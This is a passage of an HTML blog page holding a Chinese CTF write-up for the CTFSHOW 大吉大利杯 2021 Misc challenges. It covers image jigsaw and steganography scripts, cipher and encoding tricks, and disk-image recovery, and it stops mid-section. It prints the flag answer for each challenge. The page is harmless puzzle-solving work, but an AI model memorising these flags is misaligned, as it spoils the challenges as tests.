@@ -1,0 +1,512 @@
+<!DOCTYPE html>
+<html lang=zh-CN>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Misc拼图v2.0朴实无华的拼图，唯一不同的是 favicon.png 提供了原图，同时因为图片需要旋转，所以 gaps 行不通了。 这里首先使用 Chrome 插件 Resources Saver 下载所有的图片，然后写脚本拼图。因为原图已经给出，所以将原图按照题目的方式切片即得到了拼图的模板。剩下要做的就是将拼图与原图的切片一一对应然后拼合。这里采用了采样的办法，每个切片取九个采样点，然后根">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CTFSHOW 大吉大利杯 2021">
+<meta property="og:url" content="https://lemonprefect.cn/zh-CN/posts/41fb5acf.html">
+<meta property="og:site_name" content="Hexagon">
+<meta property="og:description" content="Misc拼图v2.0朴实无华的拼图，唯一不同的是 favicon.png 提供了原图，同时因为图片需要旋转，所以 gaps 行不通了。 这里首先使用 Chrome 插件 Resources Saver 下载所有的图片，然后写脚本拼图。因为原图已经给出，所以将原图按照题目的方式切片即得到了拼图的模板。剩下要做的就是将拼图与原图的切片一一对应然后拼合。这里采用了采样的办法，每个切片取九个采样点，然后根">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://butter.lumosary.workers.dev/images/archive/d6e98991-aedd-49de-83ea-90033d0eac80/1613213952302386.1dfaa2254361bab1b618da7f3c0b0406c124fd20.png">
+<meta property="og:image" content="https://butter.lumosary.workers.dev/images/archive/d6e98991-aedd-49de-83ea-90033d0eac80/1613213952493829.5803876425520d5e7f0bb982c747f05dc16e9ac4.png">
+<meta property="og:image" content="https://butter.lumosary.workers.dev/images/archive/d6e98991-aedd-49de-83ea-90033d0eac80/1613213952601784.ce893e0360300e9b38e496410b13fc737758eb0a.png">
+<meta property="og:image" content="https://butter.lumosary.workers.dev/images/archive/d6e98991-aedd-49de-83ea-90033d0eac80/1613213952736592.6c6ba2167f1c48bf3c66756d2fef8db6959dde13.png">
+<meta property="og:image" content="https://inews.gtimg.com/newsapp_ls/0/13085261981/0">
+<meta property="og:image" content="https://butter.lumosary.workers.dev/images/archive/d6e98991-aedd-49de-83ea-90033d0eac80/1613213952884823.8035a6eb7b74b33372f158cf7a070bd924c2b4fc.png">
+<meta property="og:image" content="https://butter.lumosary.workers.dev/images/archive/d6e98991-aedd-49de-83ea-90033d0eac80/1613213952987987.fee470d1bab9c4d741ec29d85e535744abe99c2f.png">
+<meta property="og:image" content="https://butter.lumosary.workers.dev/images/archive/d6e98991-aedd-49de-83ea-90033d0eac80/1613213953098088.81d335b53e7d297a990c76c516939324fc3e8cb6.png">
+<meta property="og:image" content="https://butter.lumosary.workers.dev/images/archive/d6e98991-aedd-49de-83ea-90033d0eac80/1613213953294592.24e5192096fb763e44b6aa8ca8eb912b8ff6d3a7.png">
+<meta property="og:image" content="https://butter.lumosary.workers.dev/images/archive/d6e98991-aedd-49de-83ea-90033d0eac80/1613213953416088.31f8de779dbf7196256d60d05abc4c30f69804f2.png">
+<meta property="og:image" content="https://butter.lumosary.workers.dev/images/archive/d6e98991-aedd-49de-83ea-90033d0eac80/1613213953514193.7be4f251830ddd0db58917b2ec371e2be6a1e7e3.png">
+<meta property="og:image" content="https://butter.lumosary.workers.dev/images/archive/d6e98991-aedd-49de-83ea-90033d0eac80/1613213953611917.e4a05c1c009b678edcb8b0c7ef39554151c066a1.png">
+<meta property="og:image" content="https://butter.lumosary.workers.dev/images/archive/d6e98991-aedd-49de-83ea-90033d0eac80/1613213953764336.e361a2af8783d278d28d24e5e87083c0406244c2.png">
+<meta property="og:image" content="https://butter.lumosary.workers.dev/images/archive/d6e98991-aedd-49de-83ea-90033d0eac80/1613213953880868.1644bad21e153b52561ddf0b8fbb70b4198966fa.png">
+<meta property="og:image" content="https://butter.lumosary.workers.dev/images/archive/d6e98991-aedd-49de-83ea-90033d0eac80/1613213954003065.a82ea41977e509a00fbab32bbe9e807b226ca507.png">
+<meta property="og:image" content="https://butter.lumosary.workers.dev/images/archive/d6e98991-aedd-49de-83ea-90033d0eac80/1613213954130695.155ac50574af2de72c0e6d26082fd0b2f23a5bc1.png">
+<meta property="article:published_time" content="2021-02-04T05:21:00.000Z">
+<meta property="article:modified_time" content="2021-04-28T07:47:54.982Z">
+<meta property="article:author" content="LemonPrefect">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://butter.lumosary.workers.dev/images/archive/d6e98991-aedd-49de-83ea-90033d0eac80/1613213952302386.1dfaa2254361bab1b618da7f3c0b0406c124fd20.png">
+    
+    
+      
+        
+          
+            <link rel="shortcut icon" href="https://cdn.v2ex.com/gravatar/eed1611c13fd0710bb8b3bbf8ac44cc7?s=48">
+          
+        
+      
+      
+        
+          
+            <link rel="icon" type="image/png" href="https://cdn.v2ex.com/gravatar/eed1611c13fd0710bb8b3bbf8ac44cc7?s=192">
+          
+        
+      
+      
+        
+          
+            <link rel="apple-touch-icon" size="180x180" href="https://cdn.v2ex.com/gravatar/eed1611c13fd0710bb8b3bbf8ac44cc7?s=180">
+          
+        
+      
+    
+    <!-- title -->
+    <title>CTFSHOW 大吉大利杯 2021</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+		<script type="text/x-mathjax-config">
+		  MathJax.Hub.Config({
+			tex2jax: {
+			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+			  inlineMath: [['$','$']]
+			}
+		  });
+		</script>
+		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
+	
+<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="Hexagon" type="application/atom+xml">
+<link rel="alternate" href="/rss2.xml" title="Hexagon" type="application/rss+xml">
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" "Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/writeups/">WriteUps</a></li>
+         
+          <li><a href="/tools/">工具</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/search/">搜索</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        <!-- 
+        <li><a class="icon" aria-label="上一篇 " href="/zh-TW/posts/484ca20c.html"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇 " href="/zh-TW/posts/41fb5acf.html"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        --!>
+
+        
+          
+          
+          
+            <li><a class="icon" aria-label="中文简体（大陆标准） " href="#">简</a></li>
+          
+            <li><a class="icon" aria-label="正体中文（台灣標準） " href="/zh-TW/posts/41fb5acf.html">正</a></li>
+          
+        
+
+        <li><a class="icon" aria-label="返回顶部 " href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true"></i></a></li>
+        <li><a class="icon" aria-label="分享文章 " href="#"><i class="fas fa-share-alt" aria-hidden="true" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://lemonprefect.cn/zh-CN/posts/41fb5acf.html"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://lemonprefect.cn/zh-CN/posts/41fb5acf.html&text=CTFSHOW 大吉大利杯 2021"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://lemonprefect.cn/zh-CN/posts/41fb5acf.html&title=CTFSHOW 大吉大利杯 2021"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://lemonprefect.cn/zh-CN/posts/41fb5acf.html&is_video=false&description=CTFSHOW 大吉大利杯 2021"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=CTFSHOW 大吉大利杯 2021&body=Check out this article: https://lemonprefect.cn/zh-CN/posts/41fb5acf.html"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://lemonprefect.cn/zh-CN/posts/41fb5acf.html&title=CTFSHOW 大吉大利杯 2021"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://lemonprefect.cn/zh-CN/posts/41fb5acf.html&title=CTFSHOW 大吉大利杯 2021"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://lemonprefect.cn/zh-CN/posts/41fb5acf.html&title=CTFSHOW 大吉大利杯 2021"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://lemonprefect.cn/zh-CN/posts/41fb5acf.html&title=CTFSHOW 大吉大利杯 2021"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://lemonprefect.cn/zh-CN/posts/41fb5acf.html&name=CTFSHOW 大吉大利杯 2021&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://lemonprefect.cn/zh-CN/posts/41fb5acf.html&t=CTFSHOW 大吉大利杯 2021"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Misc"><span class="toc-number">1.</span> <span class="toc-text">Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8B%BC%E5%9B%BEv2-0"><span class="toc-number">1.1.</span> <span class="toc-text">拼图v2.0</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#AA86"><span class="toc-number">1.2.</span> <span class="toc-text">AA86</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A2%91%E5%AF%BA%E5%85%AD%E5%8D%81%E5%9B%9B%E5%8D%A6"><span class="toc-number">1.3.</span> <span class="toc-text">碑寺六十四卦</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%89%9B%E5%B9%B4%E5%A4%A7%E5%90%89"><span class="toc-number">1.4.</span> <span class="toc-text">牛年大吉</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AF%B7%E9%97%AE%E5%A4%A7%E5%90%89%E6%9D%AF%E7%9A%84%E7%AD%BE%E5%88%B0%E6%98%AF%E5%9C%A8%E8%BF%99%E9%87%8C%E7%AD%BE%E5%90%97"><span class="toc-number">1.5.</span> <span class="toc-text">请问大吉杯的签到是在这里签吗</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8D%81%E5%85%AB%E8%88%AC%E5%85%B5%E5%99%A8"><span class="toc-number">1.6.</span> <span class="toc-text">十八般兵器</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%89%B2%E5%9B%BE%E7%94%9F%E6%88%90%E5%99%A8"><span class="toc-number">1.7.</span> <span class="toc-text">色图生成器</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AB%A5%E8%AF%9D%E9%95%87"><span class="toc-number">1.8.</span> <span class="toc-text">童话镇</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web"><span class="toc-number">2.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#veryphp"><span class="toc-number">2.1.</span> <span class="toc-text">veryphp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#spaceman"><span class="toc-number">2.2.</span> <span class="toc-text">spaceman</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%89%E6%89%8B%E5%B0%B1%E8%A1%8C"><span class="toc-number">2.3.</span> <span class="toc-text">有手就行</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%99%8E%E5%B1%B1%E8%A1%8C"><span class="toc-number">2.4.</span> <span class="toc-text">虎山行</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%99%8E%E5%B1%B1%E8%A1%8C%E2%80%99s-revenge"><span class="toc-number">2.5.</span> <span class="toc-text">虎山行’s revenge</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        CTFSHOW 大吉大利杯 2021
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">LemonPrefect</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2021-02-04T05:21:00.000Z" itemprop="datePublished">2021-02-04</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="拼图v2-0"><a href="#拼图v2-0" class="headerlink" title="拼图v2.0"></a>拼图v2.0</h3><p>朴实无华的拼图，唯一不同的是 <code>favicon.png</code> 提供了原图，同时因为图片需要旋转，所以 gaps 行不通了。</p>
+<p>这里首先使用 Chrome 插件 Resources Saver 下载所有的图片，然后写脚本拼图。因为原图已经给出，所以将原图按照题目的方式切片即得到了拼图的模板。剩下要做的就是将拼图与原图的切片一一对应然后拼合。这里采用了采样的办法，每个切片取九个采样点，然后根据其匹配的顺序将切片进行旋转，全部完成之后拼合即得到 flag。</p>
+<p><img src="https://butter.lumosary.workers.dev/images/archive/d6e98991-aedd-49de-83ea-90033d0eac80/1613213952302386.1dfaa2254361bab1b618da7f3c0b0406c124fd20.png"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">NinePointSamplingAnalyze</span>(<span class="params">image</span>):</span></span><br><span class="line">    width, height = image.size</span><br><span class="line">    imgObject = image.convert(<span class="string">&quot;RGB&quot;</span>)</span><br><span class="line">    pixels = imgObject.load()</span><br><span class="line">    samplings = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">            samplePixel = pixels[(width - <span class="number">1</span>) <span class="keyword">if</span> j == <span class="number">2</span> <span class="keyword">else</span> (width // <span class="number">2</span>) * j, (height - <span class="number">1</span>) <span class="keyword">if</span> i == <span class="number">2</span> <span class="keyword">else</span> (height // <span class="number">2</span>) * i]</span><br><span class="line">            samplings.append(samplePixel)</span><br><span class="line">    image.close()</span><br><span class="line">    <span class="keyword">return</span> samplings</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">SamplingMatch</span>(<span class="params">modelSample, sample</span>):</span></span><br><span class="line">    flag = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">        <span class="keyword">if</span> sample[i] == modelSample[<span class="string">&quot;sample&quot;</span>][i]:</span><br><span class="line">            flag += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> flag</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">SamplingBestRotate</span>(<span class="params">modelSample, sample</span>):</span></span><br><span class="line">    flags = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        flags.append(SamplingMatch(modelSample, sample))</span><br><span class="line">        sample = SamplingRotate(sample)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">max</span>(flags), flags.index(<span class="built_in">max</span>(flags)) * (-<span class="number">90</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">SamplingRotate</span>(<span class="params">sample</span>):</span></span><br><span class="line">    newSamplings = []</span><br><span class="line">    index = [<span class="number">6</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">2</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">        newSamplings.append(sample[index[i]])</span><br><span class="line">    <span class="keyword">return</span> newSamplings</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">SamplingBestSolve</span>(<span class="params">modelSamplings, sample</span>):</span></span><br><span class="line">    flags = []</span><br><span class="line">    degrees = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(modelSamplings)):</span><br><span class="line">        flag, degree = SamplingBestRotate(modelSamplings[i], sample)</span><br><span class="line">        flags.append(flag)</span><br><span class="line">        degrees.append(degree)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">max</span>(flags), flags.index(<span class="built_in">max</span>(flags)), degrees[flags.index(<span class="built_in">max</span>(flags))]</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;f4864ce0-18d6-4e45-bb51-08a9d47de97f&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="AA86"><a href="#AA86" class="headerlink" title="AA86"></a>AA86</h3><p>根据题目描述 <code>大约在16位操作系统还能跑的年代</code>，搜索可以找到如下信息。</p>
+<p><img src="https://butter.lumosary.workers.dev/images/archive/d6e98991-aedd-49de-83ea-90033d0eac80/1613213952493829.5803876425520d5e7f0bb982c747f05dc16e9ac4.png"></p>
+<p>于是掏出学汇编的时候用的 DOSBOX 执行一波，得到了 flag。</p>
+<p><img src="https://butter.lumosary.workers.dev/images/archive/d6e98991-aedd-49de-83ea-90033d0eac80/1613213952601784.ce893e0360300e9b38e496410b13fc737758eb0a.png"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;https:&#x2F;&#x2F;utf-8.jp&#x2F;public&#x2F;sas&#x2F;index.html&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="碑寺六十四卦"><a href="#碑寺六十四卦" class="headerlink" title="碑寺六十四卦"></a>碑寺六十四卦</h3><p>将图片反色后用 stegsolve 解出 LSB 隐写，得到一张 PNG。</p>
+<p><img src="https://butter.lumosary.workers.dev/images/archive/d6e98991-aedd-49de-83ea-90033d0eac80/1613213952736592.6c6ba2167f1c48bf3c66756d2fef8db6959dde13.png"></p>
+<p>将文件头处理好后打开，得到一张与碑上的卦对应的图。</p>
+<p><img src="https://inews.gtimg.com/newsapp_ls/0/13085261981/0" style="zoom:200%;" /><img src="https://butter.lumosary.workers.dev/images/archive/d6e98991-aedd-49de-83ea-90033d0eac80/1613213952884823.8035a6eb7b74b33372f158cf7a070bd924c2b4fc.png" alt="image-20210125233544602"></p>
+<p>然后将图上每一个对应八卦图和六十四卦速查得到如下内容。</p>
+<figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">晋 噬嗑 井 复 谦 丰</span><br><span class="line">渐 大过 睽 巽 无妄 屯</span><br><span class="line">中孚 观 归妹 革 坎 颐 </span><br><span class="line">革 明夷 否 泰 明夷</span><br></pre></td></tr></table></figure>
+
+<p>按照图上的数字解出即为 <code>5 37 26 32 8 44 11 30 53 27 39 34 51 3 52 46 18 33 46 40 7 56 40</code>，将其对应 Base64 编码表解出 <code>FlagIsLe1bnizD0uShuoH4o</code>。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;Le1bnizD0uShuoH4o&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="牛年大吉"><a href="#牛年大吉" class="headerlink" title="牛年大吉"></a>牛年大吉</h3><p>vhd 文件，挂载发现提示格式化，于是打开 WinHex 读取。发现引导扇区被擦除了，同时有 <code>？lag.7z</code> 和 <code>牛年大吉.jpg</code> 两个文件。根据提示<strong>压缩包密码在图片文件头里</strong>可知密码为 <code>89504E47</code>，解压可得 flag。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;CTFshow_The_Year_of_the_Ox&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="请问大吉杯的签到是在这里签吗"><a href="#请问大吉杯的签到是在这里签吗" class="headerlink" title="请问大吉杯的签到是在这里签吗"></a>请问大吉杯的签到是在这里签吗</h3><p>将图片套娃 foremost 之后得到四张二维码，扫出来如下内容。</p>
+<figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">- 请问DJB CTF比赛的签到处在什么地方？</span><br><span class="line">- 好像没有岔路了，一直往前走试试看</span><br><span class="line">- 好像没有岔路了，一直往前走试试看</span><br><span class="line">- 咦，这是死胡同，是不是哪里走错路了</span><br></pre></td></tr></table></figure>
+
+<p>于是回到第二张，尝试使用 StegSolve 看隐写，得到如下图片。</p>
+<p><img src="https://butter.lumosary.workers.dev/images/archive/d6e98991-aedd-49de-83ea-90033d0eac80/1613213952987987.fee470d1bab9c4d741ec29d85e535744abe99c2f.png"></p>
+<p>根据猪圈密码解密表，解得内容为 <code>FLAGDAJIADOAIDJB</code>。</p>
+<p><img src="https://butter.lumosary.workers.dev/images/archive/d6e98991-aedd-49de-83ea-90033d0eac80/1613213953098088.81d335b53e7d297a990c76c516939324fc3e8cb6.png"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;dajiadoaidjb&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="十八般兵器"><a href="#十八般兵器" class="headerlink" title="十八般兵器"></a>十八般兵器</h3><p>使用压缩文档备注<strong>2021牛年大吉</strong>解压后得到一个文本文档和十八张兵器的图。图是 jpg 的 JPHS 隐写，分别提取出来之后发现每段文本后面有几个数字，将其按照文本文档中兵器的顺序 <code>刀、枪、剑、戟、斧、钺、钩、叉、鞭、锏、锤、戈、镋、棍、槊、棒、矛、耙</code> 分类拼接，得到如下两端。</p>
+<figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">136143999223163525817639797858700963935</span><br><span class="line">3044053720460556276610613346353724230575</span><br></pre></td></tr></table></figure>
+
+<p>分别使用十进制转十六进制和八进制转十六进制处理后拼接。</p>
+<figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">666c61677b43544673686f775f31305f62415f42616e5f62316e675f51317d</span><br></pre></td></tr></table></figure>
+
+<p><code>From Hex</code> 解得 flag。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;CTFshow_10_bA_Ban_b1ng_Q1&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="色图生成器"><a href="#色图生成器" class="headerlink" title="色图生成器"></a>色图生成器</h3><p>解压文件后可得到一张图片和一个写满颜色的文本文档。将图片处理一下，只留下有小长方块的部分。</p>
+<p><img src="https://butter.lumosary.workers.dev/images/archive/d6e98991-aedd-49de-83ea-90033d0eac80/1613213953294592.24e5192096fb763e44b6aa8ca8eb912b8ff6d3a7.png"></p>
+<p>然后将其中的像素值读出来，每个小长方块记录一次。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">image = Image.<span class="built_in">open</span>(<span class="string">&quot;extracted.png&quot;</span>).convert(<span class="string">&quot;RGB&quot;</span>)</span><br><span class="line"></span><br><span class="line">extractedFile = <span class="built_in">open</span>(<span class="string">&quot;extracted.txt&quot;</span>, <span class="string">&quot;w&quot;</span>)</span><br><span class="line">width, height = image.size</span><br><span class="line">widthPiece = width // <span class="number">5</span></span><br><span class="line">heightPiece = height // <span class="number">20</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(heightPiece):</span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(widthPiece):</span><br><span class="line">        pixel = image.getpixel((<span class="number">5</span> * y, <span class="number">20</span> * x))</span><br><span class="line">        colorByte = <span class="built_in">str</span>((pixel[<span class="number">0</span>] <span class="keyword">if</span> pixel[<span class="number">0</span>] != <span class="number">0</span> <span class="keyword">else</span> pixel[<span class="number">1</span>] <span class="keyword">if</span> pixel[<span class="number">1</span>] != <span class="number">0</span> <span class="keyword">else</span> pixel[<span class="number">2</span>]))</span><br><span class="line">        extractedFile.write(<span class="string">&quot;&#123;&#125; &quot;</span>.<span class="built_in">format</span>(colorByte))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] Written &#123;&#125;&quot;</span>.<span class="built_in">format</span>(colorByte))</span><br><span class="line">extractedFile.close()</span><br></pre></td></tr></table></figure>
+
+<p>将所得的内容经过 <code>From Decimal</code> 解码之后可以得到一个 rar 压缩文档。</p>
+<p><img src="https://butter.lumosary.workers.dev/images/archive/d6e98991-aedd-49de-83ea-90033d0eac80/1613213953416088.31f8de779dbf7196256d60d05abc4c30f69804f2.png"></p>
+<p>将 rar 压缩文档解压可得一张图片。010 editor 打开图片可发现文件尾部有 zip 压缩文档，将其提取出来。使用 Cloakify 的解密工具，第一步得到的文本文档的内容作为 key 解密 rar 压缩文档的注释内容。</p>
+<p><img src="https://butter.lumosary.workers.dev/images/archive/d6e98991-aedd-49de-83ea-90033d0eac80/1613213953514193.7be4f251830ddd0db58917b2ec371e2be6a1e7e3.png"></p>
+<p>得到提取出来的 zip 压缩包的密码 <code>D3arD4La0P1e45eD4iDa1Wo</code>。解压提取出来的 zip 压缩文档之后可以得到一个 .pyc 文件。将其使用<a target="_blank" rel="noopener" href="http://tools.bugscaner.com/decompyle/">在线反编译工具</a>反编译之后可以得到如下代码。</p>
